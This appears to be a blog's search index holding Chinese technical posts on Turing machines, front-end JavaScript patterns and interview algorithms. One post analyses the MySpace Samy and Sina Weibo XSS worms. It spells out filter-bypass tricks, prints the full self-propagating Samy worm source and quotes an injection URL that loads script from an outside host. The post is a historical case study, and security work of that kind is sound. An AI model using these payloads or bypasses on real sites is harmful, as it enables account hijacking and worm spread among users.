<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[图灵机杂谈]]></title>
    <url>%2F2017%2F11%2F28%2Fturing%2F</url>
    <content type="text"><![CDATA[图灵早年在剑桥大学求学，在那个年代，剑桥大学的大数学家罗素和怀特海已经创立了“数理逻辑学”。“数理逻辑”这个学科的创建，起源于一个逻辑上的“悖论”。为了非专业人士都能明白逻辑悖论的含义，哲学家或者数学家喜欢用讲故事的办法来解释它。一个经典的故事是：村子里有位理发师，他为而且只为村子里所有那些不给自己理发的人理发。数学的逻辑推理上会出现类似的悖论。数学家们十分担心“数学大厦”会因悖论的存在而坍塌，于是他们都想方设法去修补数学基础。例如，康托发表专著《集合论》，罗素与怀特海联合撰写三卷《数学原理》。 剑桥大学是“数理逻辑学”的发源地与大本营，一群聪明而勤奋的青年数学家聚集在数学泰斗罗素教授的周围，图灵是其中的佼佼者。1935年，刚刚毕业，年仅23岁的图灵就被剑桥大学国王学院甄选为研究员，成为剑桥大学有史以来最年轻的研究员。正是图灵在数学，尤其是在“数理逻辑学”方面的深厚功底，令他几年后终于厚积薄发，一举奠定了他计算机科学的创始人的地位。 图灵先知先觉，在电子计算机远未问世之前，他已经想到所谓“可计算性”的问题。物理学家阿基米得曾宣称:“给我足够长的杠杆和一个支点，我就能撬动地球。”类似的问题是，数学上的某些计算问题，是不是只要给数学家足够长的时间，就能够通过“有限次”的简单而机械的演算步骤而得到最终答案呢？这就是所谓“可计算性”问题，一个必须在理论上做出解释的数学难题。 经过智慧与深邃的思索，图灵以人们想不到的方式，回答了这个既是数学又是哲学的艰深问题。1936年，图灵在伦敦权威的数学杂志上发表了一篇划时代的重要论文《可计算数字及其在判断性问题中的应用》。文章里，图灵超出了一般数学家的思维范畴，完全抛开数学上定义新概念的传统方式，独辟蹊径，构造出一台完全属于想象中的“计算机”，数学家们把它称为“图灵机”。这样的奇思妙想只能属于思维像“袋鼠般地跳跃”的图灵。 “图灵机”想象使用一条无限长度的纸带子，带子上划分成许多格子。如果格里画条线，就代表“1”；空白的格子，则代表“0”。想象这个“计算机”还具有读写功能:既可以从带子上读出信息，也可以往带子上写信息。计算机仅有的运算功能是:每把纸带子向前移动一格，就把“1”变成“0”，或者把“0”变成“1”。“0”和“1”代表着在解决某个特定数学问题中的运算步骤。“图灵机”能够识别运算过程中每一步，并且能够按部就班地执行一系列的运算，直到获得最终答案。 “图灵机”是一个虚拟的“计算机”，完全忽略硬件状态，考虑的焦点是逻辑结构。图灵在他那篇著名的文章里，还进一步设计出被人们称为“通用图灵机”的模型，它可以模拟其他任何一台解决某个特定数学问题的“图灵机”的工作状态。他甚至还想象在带子上存储数据和程序。“通用图灵机”实际上就是现代通用计算机的最原始的模型。 不过图灵在提出图灵机构想之后，又发现了新问题，有些问题图灵机是无法计算的。比如定义模糊的问题，如“人生有何意义”，或者缺乏数据的问题，“明天3D中奖号是多少”，其答案当然是无法计算出来的。但也有一些定义完美的计算问题，它们亦是不可解的，这类问题称为不可计算问题。 不可计算的问题在实践中几乎碰不到，事实上，很难找到这样的例子，既不可计算但又有人向计算的明确定义的问题。一个罕见的问题是所谓的停机问题。设想要编写一个用于检查并判定另一个程序是否会运行结束的程序，而事实上，不存在一个程序能够判断另一个程序是否与无限循环有染。我们可以来这样设想：假定我们有一个Test程序，此程序把别的测试程序当成输入，我们把它插入另一个程序Paradox（悖论）中，并在Test中使用Paradox函数作为参数（即Paradox（） { … ；Test（Paradox）；…}）。这个Paradox函数的编写思路是这样的，如果Test程序判断Paradox会运行结束，那么Paradox就进入无限循环，如果Test判断Paradox不会结束，则Paradox函数立刻终止。于是Test函数对Paradox函数无效，所以判断函数是否会终止的程序不存在。 计算机不能解一些问题并不是计算机的弱点，因为停机问题本质上是不可解的，不可能建造出一个解停机问题的机器。通用计算机无法完成的计算，无论什么东西同样无法胜任。]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>图灵机</tag>
        <tag>计算模型</tag>
        <tag>图灵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS蠕虫攻击真实案例两则·过程及原理分享]]></title>
    <url>%2F2017%2F09%2F06%2Fxss-instance%2F</url>
    <content type="text"><![CDATA[第一个要分享的可以说是世界第一则XSS蠕虫事件，该事件的主角是社交网站myspace，黑客叫Kamkar（ 博客地址 ），黑客大牛。另一件则是跟新浪微博有关。之前老有同学抱怨自己微博莫名其妙发布了些奇怪的东西，看了这篇文章应该就会了解其中原委了吧。 故事一：Myspace以下文章是网友根据Kamkar在其Github上讲述的如何在MySpace上实现第一个XSS工具蠕虫代码的说明翻译的。 Myspace 屏蔽了很多标志符。事实上，他们只允许&lt; a >,&lt; img >类，和&lt; div >类，或许还有其他一些（例如，&lt; embed >类）。他们不允许&lt; script >类，&lt; body >类，onClinks,onAnythings,带javascript的&lt; href >类。但是某些浏览器（IE，部分Safari和其他）允许CSS标识符中带有javascript.即便如此，我们也需要javascript能够正常运行。例如： 1&lt;div style=”background:url(‘javascript：alert(1)’)”&gt; 不能对Div 标识符使用引号，因为已经使用了单引号和双引号。这让JS的编程非常困难。为了让JS运行，我们使用表达式来保存JS代码和通过函数名来运行。例如 1&lt;div id=”mycoce” expr=”alert(‘hah!’)”sytle=”background:url(‘javascript：eval(document.all.mycode.expr)’)”&gt; 现在我们可以执行带单引号的Javascript代码了。但是，MySpace网站禁止了关键字”javascript”.为了实现目的，某些浏览器认可“java\nscript”（就是java\script 为”javascript”.例如: 1&lt;divid=”mycode”expr=”alert(‘hah!’)”style=”background:url(‘javaScript:eval(document.all.mycode.expr)’)”&gt; 很好，当我们让单引号其效果后，我们有时还需要双引号。我们将引号转义，例如，“foo\”bar”. Myspace 打击我一下，他们禁止了所有转义，无论是双引号还是单引号。但是，我们依然可以在javascript 中将10进制翻译成ASCII来生成引号。例如: 1&lt;div id=”mycode”expr=”alert(‘doublequota:’+String.fromCharCode(34))”style=”background:url(‘javScript:eval(document.all.mycode.expr)’)”&gt; 为了将代码发布到真正展示的用户简介页面上，我们需要得到这些页面源码。为了获得包含客户ID的浏览页面的源码，我们可以使用document.body.innerHTML。但是Myspace再次打击了我，他们禁止了标识“innerHTML “.我们可以用eval函数来拼接两个字符串组成“innerHTML”.例如: 1alert(eval(‘document.body.innt’+’rHTML’)) 是时候访问其他页面了。通常我们使用”iframes”格式，但是即便是隐藏的，“iframes”并不有效，会让用户明显感到有其他东西在运行。所以我们采用AJAX(XML-HTTP)来让实际用户产生HTTP GET和POST到页面。当然，Myspace禁止了XML-HTTP请求所必需的敏感词“onreadstatechange”,我们再次使用EVAL来拼接生产该敏感词。另外，要XML-HTTP在myspace 有效果还需要Cookies.例如: 1eval(‘xmlhttp.onread’+’ystatechange=callback’); 是时候在用户简介上执行GET来获得他们的Hero列表。我们不必删除任何heros,我们仅仅是将自己添加到已有的列表中。如果我们GET他们的简介，我们就能获取他们的列表并且保存备用。综上所述，用XML-HTTP来实现是简单的，除非我们要获得当前浏览该简介的用户ID。正如我说的，我们可以从获取页面源码来实现。好了，我们需要在页面中搜索关键词。但是如果我们这么做，我们会发现自己，因为我们的代码包含相同的关键字。我们再次使用eval()来拼接字符串来避免这个问题。 到此，我们有了heros列表。第一，让我们在addFriends页面执行一个XML-HTTPPOST请求把自己加到朋友列表中。欧不，这样不行，为啥？我们正在profile.myspace.com页面，但是POST动作要在www.myspace.com 页面去运行。但是XML-HTTP不允许在不同域名间实现GETs/POSTs。为了避免这样，我们要去同一URL而不是在www.myspace.com 页面。你可以继续从www.myspace.com 浏览简介，通过在同一域名中重新装载运行我们执行POST的页面。例如: 12if(location.hostname== ‘profile.myspace.com’)document.location= ‘http://www.myspace.com’+location.pathname + location.search; 最后我们执行POST请求。但是，当我们发送POST请求后没有添加用户。为啥？原来Myspace为一个预POST页面生产了一个哈希值，例如在“你确定添加该用户为朋友页面”。如果这个哈希值没有与POST一同发生的话，这个POST不会成功执行。为了避免这样，在添加用户前我们模拟一个浏览器去GET该页面，通过分析源码来取得该哈希值，然后带上该哈希值去执行POST请求。 一旦POST请求结束，我们还要添加一个Hero和执行代码。这段代码执行完后就会到hero的同一地方，所以我们只有一个POST请求就可以了。但是，我们需要预GET一个页面来得到一个新的哈希值。但是，第一我们不得不重新生成我们要POST的代码。最简单的办法是获取我们要的页面源码，分析出代码后在发出POST请求。到此为止万事俱备。为了POST请求正在运行我们需要对代码做编码或者转义。可恶，还是不能运行。显然，javascript的URL-Encoding和escape（） 函数不能转义所以必须要的代码。所以我们不得不人工来做这些工作确保必要的代码正确转义。我们添加了一条“but most of all ,samy is my hero”到代码。哇，我们自我复制了一个蠕虫代码。 还有其他限制，例如，最大长度，必需紧凑的代码，没有空格，混乱的命名，重复使用的函数等等。 故事二：新浪微博这个事件是发生在2011年6月28日，敲响国内关于SNS（Social Network Site）网站安全管理的警钟！一直以来，为了SNS更快的发展和获益，很多大型的SNS网站忽略对于安全的管理，人人网，百度空间，搜狐博客这些等都在不同时间内受过蠕虫病毒的侵害，在这其中XSS攻击手法在这些SNS网站上屡试不爽。在此之前，国内多家著名的SNS网站和大型博客网站都曾遭遇过类似的攻击事件，只不过没有形成如此大规模传播。 案例回顾6月28日晚，新浪微博遭遇到XSS蠕虫攻击侵袭，微博用户中招后，会自动通过发微博和私信的方式将XSS蠕虫信息对外传播，发布带有恶意脚本的链接地址，当用户的粉丝点击带有恶意脚本的链接后就会再次中毒，进而形成恶性循环。其中众多加V认证的用户受到感染，当此类用户发布相关微博和私信内容后，蠕虫的传播将变得更为广泛，影响也更为严重。在不到一个小时内，超过三万的微博用户受到病毒感染 案例分析 首先，黑客通过对新浪微博的分析测试发现新浪名人堂部分由于代码过滤不严，导致XSS漏洞的存在，并可以通过构造脚本的方式植入恶意代码。通过分析发现，在新浪名人堂部分中，当提交http://weibo.com/pub/star/g/xyyyd“ >&lt; script src=//www.2kt.cn/images/t.js > \&lt; / script >?type=update时，新浪会对该字符串进行处理，变成类似http://weibo.com/pub/star.php?g=xyyyd“ >&lt; script src=//www.2kt.cn/images/t.js >&lt;/ script >?type=update，而由于应用程序没有对参数g做充足的过滤，且将参数值直接显示在页面中，相当于 weibo.com 在页面中嵌入了一个来自于 2kt.cn的JS脚本。该JS脚本是黑客可以控制的文件，使得黑客可以构造任意JS脚本嵌入到weibo.com的页面中，且通过Ajax技术完全实现异步提交数据的功能，进而黑客通过构造特定的JS代码实现了受此XSS蠕虫攻击的客户自动发微博、添加关注和发私信等操作。 然后，黑客为了使该XSS蠕虫代码可以大范围的感染传播，会通过发私信或发微博的方式诱惑用户去点击存在跨站代码的链接，尤其是针对V标认证的用户，因为此类用户拥有大量的关注者，所以如果此类用户中毒，必然可以实现蠕虫的大范围、快速的传播。 最后，当大量的加V认证账户和其他普通用户中毒后，这些用户就会通过发微博和发私信的方式将该XSS蠕虫向其他用户进行传播，进而导致了该XSS蠕虫的大范围、快速的传播与感染 附Samy 蠕虫源码123456789101112131415161718192021222324&lt;div id=mycode style="BACKGROUND:url('javascript:eval(document.all.mycode.expr)')"expr="var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;returnC&#125;else&#123;return eval('document.body.inne'+'rHTML')&#125;&#125;functiongetData(AU)&#123;M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split('&amp;');var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split('=');AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com')&#123;document.location='http://www.myspace.com'+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),'up_launchIC( '+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=newString();var O=0;for(var Pin AV)&#123;if(O&gt;0)&#123;N+='&amp;'&#125;varQ=escape(AV[P]);while(Q.indexOf('+')!=-1)&#123;Q=Q.replace('+','%2B')&#125;while(Q.indexOf('&amp;')!=-1)&#123;Q=Q.replace('&amp;','%26')&#125;N+=P+'='+Q;O++&#125;returnN&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;returnfalse&#125;eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST')&#123;J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)&#125;J.send(BK);returntrue&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,'name='+B+BG+B+' value='+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG=='Mytoken')&#123;T=B&#125;else&#123;T='&amp;'&#125;var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;elseif(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject('Msxml2.XMLHTTP')&#125;catch(e)&#123;try&#123;Z=newActiveXObject('Microsoft.XMLHTTP')&#125;catch(e)&#123;Z=false&#125;&#125;&#125;returnZ&#125;var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE)&#123;AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1)&#123;if(AF)&#123;AG+=AF;varAR=getFromURL(AU,'Mytoken');varAS=newArray();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');varAS=newArray();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;functionmain()&#123;var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');varAS=newArray();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add toFriends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;functionhttpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;returnfalse&#125;eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST')&#123;xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;xmlhttp2.send(BK);returntrue&#125;"&gt;&lt;/DIV&gt;]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用redux-thunk实现异步操作的中止]]></title>
    <url>%2F2017%2F08%2F30%2Fredux-thunk%2F</url>
    <content type="text"><![CDATA[前端开发中常常会有这样的需求：设计一个select组件，每做一次选择就用ajax异步加载数据到指定页面。 实现这个需求并不困难，但是仅仅是这样做，难免会出现一些不太理想的体验：如果用户迅速的切换选项，那么返回的结果不一定是用户最后选择的那个结果。 因为请求是异步的，而请求发出到获得响应的过程时间是不可估的，用户很可能临时改变主意或等不及了而去发出一个新的请求。而页面最终呈现的结果是以最后到达的请求为准，因此具有一定的随机性。这里使用redux的中间件thunk来改进action构造函数，达到‘中断‘用户最后一次之前的所有请求，只保留最后一次的效果。 关于中断和截流，月影有一篇关于函数式编程的PPT将的特别好，推荐大家去看一下，PPT中有嵌入JSBIN，大家可以直接在PPT中调试，《函数式编程，你必须知道的那些事》 而这里要提到的方法跟上述PPT中的都不一样，而且同样巧妙。这里预先定义三个action创造函数: fetchDataStarted fetchDataSuccess fetchDataFailed 顾名思义，分别返回数据发起和数据返回成功／失败的action，展示组件将根据传入的props的特定的状态渲染不同的内容（即‘数据加载中···‘，‘数据加载成功即其内容‘，‘数据加载失败及其原因‘）。那么现在就是要对每点击一次要派发的那个action对应的构造函数进行改写：123456789101112131415161718192021222324252627let nextSeqId = 0export const fetchDataAction = (selectQuery) =&gt; &#123; return (dispatch) &#123; const apiUrl = 'data/select/$&#123;selectQuery&#125;' const SeqId = ++nextSeqId const dispatchIfValid = action =&gt; &#123; if（SeqId === nextSeqId）&#123; return dispatch(action) &#125; &#125; // 将状态改为开始发起请求 dispatchIfValid(fetchDataStarted) // 发起请求 fetch(apiUrl).then((response) =&gt; &#123; if(response.status !== 200) &#123; throw new Error('Fail to get Data with status'+response.status) &#125; response.json().then((responseJson) =&gt; &#123; dispatchIfValid(fetchDataSuccess(responseJson.data)) &#125;).catch( error =&gt; &#123; dispatchIfValid(fetchDataFailed(error)) &#125;) &#125;).catch( error =&gt; &#123; dispatchIfValid(fetchDataFailed(error)) &#125;) &#125;&#125; 这里定义了一个文件模块级的变量nextSeqId, 给所有的dispatch函数加了个包装函数，在执行前先判断请求发起时定义的seqId是否和当前的nextSeqId相等，如果相等才执行。虽然不能真正的‘中止‘请求，但是可以通过这种方法让一个API请求被忽略，达到同样的效果。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>react</tag>
        <tag>redux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用es6语法实现event类]]></title>
    <url>%2F2017%2F08%2F28%2Fes6-event%2F</url>
    <content type="text"><![CDATA[公司转正面试做的一道题，由于实习期间也一直用的es6语法，所以就用es6实现了下。写法很多，整理出来，供大家参考。 题目，实现一个Event类，继承自此类的对象都会拥有四个方法on,off,once和emit,可以实现链式操作 题干描述很简单，考察的点却有一定深度。由这道题的解题思路一定程度上也能反映出解题者对一些设计模式的理解，如发布-订阅者模式，单例模式。 代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class EventEmitter&#123; constructor()&#123; this._events=&#123;&#125; &#125; on(event,callback)&#123; let callbacks = this._events[event] || [] callbacks.push(callback) this._events[event] = callbacks return this &#125; off(event,callback)&#123; let callbacks = this._events[event] this._events[event] = callbacks &amp;&amp; callbacks.filter(fn =&gt; fn !== callback) return this &#125; emit(...args)&#123; const event = args[0] const params = [].slice.call(args,1) const callbacks = this._events[event] callbacks.forEach(fn =&gt; fn.apply(this, params)) return this &#125; once(event,callback)&#123; let wrapFunc = (...args) =&gt; &#123; callback.apply(this,args) this.off(event,wrapFunc) &#125; this.on(event,wrapFunc) return this &#125;&#125;// 测试let ee = new EventEmitter();function a() &#123; console.log('a')&#125;function b() &#123; console.log('b')&#125;function c() &#123; console.log('c')&#125;function d(...a) &#123; console.log('d',...a)&#125;ee.on('TEST1', a).on('TEST2', b).once('TEST2', c).on('TEST2',d);ee.emit('TEST1');console.log('....')ee.emit('TEST2');// In test2// In test2 againconsole.log('....')ee.emit('TEST2'); 更多写法可以参见张容铭的那版《JavaScript设计模式》第17章：通信卫星-观察者模式]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>event</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[codewars上的一道训练函数式编程思维的编程题]]></title>
    <url>%2F2017%2F08%2F25%2Fcodewars-func%2F</url>
    <content type="text"><![CDATA[分享codewars上的一道训练函数式编程思维的编程题。 https://www.codewars.com/kata/church-numbers-add-multiply-exponents/train/javascript这个题目用了大量的篇幅进行思路引导,最后让实现加法，乘法和指数乘法三个函数，这里我就不翻译了，只给出题目给出的条件和所有目标 条件整理一下题目给出的条件： 函数churchify：使用方式：churchify(n:Number)(f:function)(x:number)，返回结果为f performed on x n times ，即嵌套执行n次f(x)。该函数的实现方式很多，题目直接给出了一种实现： 1234var churchify = (n) =&gt; (f) =&gt; (x) =&gt; &#123; for(var i = 0; i &lt; n; i++) x = f(x); return x; &#125;; 函数numerify:接收一个函数作为参数，这个函数是一个辅助函数，定义是这样的： 1var numerify = (c) =&gt; c((i) =&gt; i + 1)(0); 函数tesChurch:这个函数很重要： 1var testChurch = (fn, x, y) =&gt; numerify( fn( churchify(x) )( churchify(y) ) ) 问题要求设计三个函数Add,Mul,Pow。使得： testChurch(Add,x,y)返回的结果为 x+y的结果 testChurch(Mul,x,y)返回的结果为 x*y的结果 testChurch(Pow,x,y)返回的结果为 x^y(x的y次方)的结果 另外题目还要求要考虑算法的复杂度，否则会超时，不要直接调用Math.pow方法。 这道题挺有意思的，大家不妨思考下怎么解，给出我的答案吧： 解答123var Add = (c1) =&gt; (c2) =&gt; (f) =&gt; (x) =&gt; c1(f)(c2(f)(x));var Mul = (c1) =&gt; (c2) =&gt; (f) =&gt; (x) =&gt; c1((i)=&gt;i+c2(f)(x))(x);var Pow = (c1) =&gt; (c2) =&gt; (f) =&gt; (x) =&gt; c2((i)=&gt;i*c1(f)(x))(1);]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客建站手记--CSS全屏背景图片加载优化方案]]></title>
    <url>%2F2017%2F08%2F22%2Fbgimage-opt%2F</url>
    <content type="text"><![CDATA[问题描述在建站之初，我用的随机背景图片作为整个网站的背景，再加上调用的api:unsplash.com（ 一个免费高清素材网站 ）逼格极高，所以显得整个网站即文艺又酷炫，但是由于图片尺寸较大，在网络环境一般的情况下，首屏用户体验不是很好。具体是什么样的呢？ 我从segmentfault上找了个图，情况类似： 再进行改造之后，期望是这样的： 可行性方案web图片加载优化的思路很多，这里不是讨论的重点，贴一个比较好的总结贴吧： web前端图片极限优化策略 这里可以采取的解决方法主要有两个 采用渐进式jpeg图像 在图片onload之后设为背景 使用渐进式JPEG来提升体验JPEG文件有两种保存方式：Baseline JPEG（标准型）和Progressive JPEG（渐进式）。两种格式有相同尺寸以及图像数据，他们的扩展名也是相同的，唯一的区别是二者显示的方式不同。可以通过Photoshop进行修改 Baseline JPEG 这种类型的JPEG文件存储方式是按从上到下的扫描方式，把每一行顺序的保存在JPEG文件中。打开这个文件显示它的内容时，数据将按照存储时的顺序从上到下一行一行的被显示出来，直到所有的数据都被读完，就完成了整张图片的显示。 Progressive JPEG 和Baseline一遍扫描不同，Progressive JPEG文件包含多次扫描，这些扫描顺寻的存储在JPEG文件中。打开文件过程中，会先显示整个图片的模糊轮廓，随着扫描次数的增加，图片变得越来越清晰。 由于这里我请求的图片来自网络API所以这种方法及暂时不可取了，下面重点讨论下第二种方法。 图像onload之后插入背景随机背景图设置方法先贴一下本站设置随机背景图的方法，很简单，为body加一个这样的css即可1234567body &#123; background: url(https://source.unsplash.com/random/1600x900); background-repeat: no-repeat; background-attachment:fixed; background-size: cover; background-position:50% 50%;&#125; onload显示背景图原理也很简单，三步走起： 设置一个默认的背景色 把背景图放置在沙盒中加载 图片加载完后把背景图拿出来设置为dom中节点的backgroundImage 重点就在如何把背景图和dom节点联结起来。这里也有两种方案，一种比较优雅，但是实施起来会繁琐些，另一种很接地气，用js就可以搞定 优雅的方式：IOING使用IOING(什么是IOING? 一种渐进式Web App 前端开发引擎 )：IOING 的 DOM 引擎 和 CSS 引擎可以轻松的实现上述功能123.bg &#123; background: #fff onload url(./bg.png) center no-repeat;&#125; 这种方法有个很大的缺点就是不能用在body标签上 简洁的方式: Image元素构造器上面那种方法虽然优雅，但是成本未免高了些。因此我自己倒腾了下，算式实现了这个功能，在index的body最后加段script：1234567(function()&#123; var imageBg = new Image(); imageBg.onload = function () &#123; document.body.style.backgroundImage= 'url(https://source.unsplash.com/random/1600x900)' &#125; imageBg.src = 'https://source.unsplash.com/random/1600x900' &#125;)() 这里的’沙盒’就是有js创建的Image元素，然后在onload事件中设置背景，由于两次请求的url完全相同，因此浏览器只会发出一次请求，即不会增加新的网络开销，也完成了整图加载的需求。]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>CSS</tag>
        <tag>性能优化</tag>
        <tag>渐进式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【美团面试】不开辟新的内存空间实现数组去重]]></title>
    <url>%2F2017%2F08%2F20%2Fmeituan-mianshi%2F</url>
    <content type="text"><![CDATA[美团内推面试的一道题。如果没有变量限制，方法很多很多，这里面试官要求不要定义新的引用型变量其实吧，只是不开辟一个对象或数组变量。用splice修改自身： 123456789function fn(resArr)&#123; for (var i=0;i&lt;resArr.length;i++)&#123; if(resArr.indexOf(resArr[i])!==i)&#123; resArr.splice(i,1);//利用splice删除第二次出现的值， i--;//重要！！原始数组倍删除某个元素后，后续元素索引进一，若想继续遍历，则索引-1 &#125; &#125; return resArr;&#125; 当然，这样写可能并不是面试官想要的，比较这里用了indexOf，既然是考察算法基础，所以尽量不要用特定语言的一些特性。这道题，说白了就是，在空间复杂度O(1)内设计算法，尽可能也降低时间复杂度。 空间换时间，很多人都知道，用哈希表嘛，那既要保证时间复杂度低，又要保证空间复杂度为O（1）怎么做？且看下面这种方法： 思路： 直接在原数组上进行排序，从头开始操作，使得操作完后的数组i出现在下标为i的位置，那么有些位置可能存在多个数字，同时有些位置可能没有数字，这样必然能够找到重复的数字 这种方法能够在O（n）的时间复杂度和O(1)的空间复杂度找到重复数字：1234567891011121314function duplicate(arr)&#123; const len = arr.length for(let i=0;i&lt;len;i++)&#123; while(arr[i]!= undefined &amp;&amp; arr[i] != i)&#123; if(arr[i] == arr[arr[i]])&#123; arr[i] = undefined &#125; const temp = arr[i] arr[i] = arr[temp] arr[temp] = temp &#125; &#125; return arr&#125; 这段代码，把重置的数字置为undefined，有的面试官可能是要求返回重复数字，有的可能是返回数组，如果是后者，在进行一遍过滤就好了。 另外面试官还问了写 缓存相关的，从磁盘缓存和304缓存的区别，为什么要同时用新鲜值和校验值双重验证。面试整体难度一般吧，但是面试官容易问到比较偏的点，所以主导聊天内容很重要。 另外整理下缓存相关的知识：目前主流的浏览器缓存分为两类，强缓存和协商缓存，它们的匹配流程如下： （1）浏览器发送请求前，根据请求头的expires和cache-control判断是否命中强缓存策略，如果命中，直接从缓存获取资源，并不会发送请求。如果没有命中，则进入下一步。 （2）没有命中强缓存规则，浏览器会发送请求，根据请求头的last-modified和etag判断是否命中协商缓存，如果命中，直接从缓存获取资源。如果没有命中，则进入下一步。 （3）如果前两步都没有命中，则直接从服务端获取资源。 可以参考这篇文章：《你应该知道的浏览器缓存知识 - 知乎专栏》 chrome中，本地缓存还分为 from disk cache 磁盘缓存 from memory cache 内存缓存]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里前端算法面试题两道]]></title>
    <url>%2F2017%2F08%2F15%2Fcode-dfs%2F</url>
    <content type="text"><![CDATA[前两天去参加阿里的提前批面试，也是巧了，两位不同的面试官出的算法题解题思路都是异曲同工。都可以用递归的方式进行深度优先搜索 更巧的是阿里今年秋招的前端笔试也出了一道类似的题, 学生信息组合的全排列填充表格，跟我一面的那道题基本一样。话不多说，上代码。 二维数组的全排列组合。 如输入[[1,2],[3,4],[5,6]]输出：[ 1, 3, 5 ][ 1, 3, 6 ][ 1, 4, 5 ][ 1, 4, 6 ][ 2, 3, 5 ][ 2, 3, 6 ][ 2, 4, 5 ][ 2, 4, 6 ] 代码实现：12345678910111213141516171819function printArr(arr,n,res)&#123; for(var i = 0; i&lt;arr[i].length;i++)&#123; if(n == 0)&#123; res = [] &#125; if(n&lt;arr.length)&#123; var _res = res.slice() _res.push(arr[n][i]) if(n == arr.length-1)&#123; console.log(_res) &#125;else&#123; printArr(arr,n+1,_res) &#125; &#125; &#125;&#125;// 测试：var arr = [[1,2],[3,4],[5,6]]printArr(arr,0) 打印青蛙跳台阶的所有方式 注意 不是求方式的个数，而是打印每种情况台阶数为10，每次跳1次或两次 代码实现：12345678910111213141516171819function step(n,res)&#123; if(n==0)&#123; res=[] &#125; var i=1 while(i&lt;3)&#123; if(n+i&lt;=10)&#123; var _res = res.slice() _res.push(i) if(n+i == 10) &#123; console.log(_res) &#125;else&#123; step(n+i, _res) &#125; &#125; i++ &#125;&#125;step(0)]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>面试</tag>
